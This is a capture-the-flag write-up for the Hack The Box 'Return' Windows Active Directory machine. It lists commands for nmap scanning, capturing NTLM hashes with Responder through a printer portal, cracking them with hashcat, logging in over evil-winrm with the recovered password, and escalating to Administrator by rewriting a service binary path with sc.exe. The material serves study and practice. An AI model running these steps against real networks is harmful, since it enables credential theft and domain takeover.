
==============================
HTB MACHINE – RETURN (WRITEUP)
==============================

Target: Windows / Active Directory  
Goal: Initial foothold → service account → privilege escalation → Administrator


=====================================================
1 — NMAP ENUMERATION
=====================================================

First perform a port scan.

nmap -sC -sV -p- 10.10.11.X

Important ports:

53   DNS
88   Kerberos
135  RPC
139  SMB
389  LDAP
445  SMB
5985 WinRM
9389 AD Web Services

This indicates the target is part of an **Active Directory environment**.


=====================================================
2 — WEB ENUMERATION
=====================================================

Opening the web page reveals a **printer configuration portal**.

The page asks for:

Printer IP address

This suggests the server may try to connect to the provided address.


=====================================================
3 — RESONDER ATTACK
=====================================================

Start Responder on Kali.

sudo responder -I tun0

Enter Kali IP address in the printer configuration page.

Example:

10.10.14.X


=====================================================
4 — NTLM HASH CAPTURE
=====================================================

The server attempts to authenticate to our machine.

Responder captures credentials:

svc-printer::DOMAIN:NTLMv2 hash

This is the **printer service account**.


=====================================================
5 — CRACK HASH
=====================================================

Crack the hash using hashcat.

hashcat -m 5600 hash.txt rockyou.txt

Recovered credentials:

svc-printer / 1edFg43012!!


=====================================================
6 — WINRM LOGIN
=====================================================

Use the credentials to obtain a shell.

evil-winrm -i 10.10.11.X -u svc-printer -p 1edFg43012!!

Now we have a PowerShell shell on the target.


=====================================================
7 — ENUMERATE PRIVILEGES
=====================================================

Check group membership.

whoami /groups

The user belongs to:

Server Operators


=====================================================
8 — PRIVILEGE ESCALATION
=====================================================

Server Operators can modify services.

Change the service binary path to execute a command as SYSTEM.

sc.exe config VSS binPath= "cmd.exe /c net localgroup administrators svc-printer /add"


=====================================================
9 — START SERVICE
=====================================================

Start the service.

sc.exe start VSS

The command runs with SYSTEM privileges and adds svc-printer to the Administrators group.


=====================================================
10 — ADMIN SHELL
=====================================================

Reconnect using Evil-WinRM.

evil-winrm -i 10.10.11.X -u svc-printer -p 1edFg43012!!

Check privileges.

whoami

Output:

nt authority\system
or administrator


=====================================================
11 — ROOT
=====================================================

Retrieve the root flag.

type C:\Users\Administrator\Desktop\root.txt


=====================================================
ATTACK FLOW
=====================================================

Web printer portal
↓
Responder attack
↓
Capture NTLM hash
↓
Crack service account password
↓
WinRM login
↓
Server Operators group
↓
Service abuse
↓
Administrator access
